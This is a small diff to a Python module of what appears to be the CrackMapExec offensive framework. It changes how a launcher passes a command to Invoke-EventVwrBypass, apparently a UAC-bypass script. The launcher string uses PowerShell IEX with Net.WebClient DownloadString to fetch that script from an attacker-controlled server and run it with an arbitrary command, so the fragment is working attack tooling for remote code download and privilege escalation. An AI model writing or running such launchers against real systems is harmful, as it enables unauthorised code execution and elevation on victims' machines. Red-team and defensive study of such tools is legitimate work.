@@ -46,7 +46,7 @@ class CMEModule:
     def launcher(self, context, command):
         launcher = '''
         IEX (New-Object Net.WebClient).DownloadString('{server}://{addr}:{port}/Invoke-EventVwrBypass.ps1');
-        Invoke-EventVwrBypass -Force -Command "cmd.exe /c {command}";
+        Invoke-EventVwrBypass -Force -Command "{command}";
         '''.format(server=context.server,
                    addr=context.localip,
                    port=context.server_port,
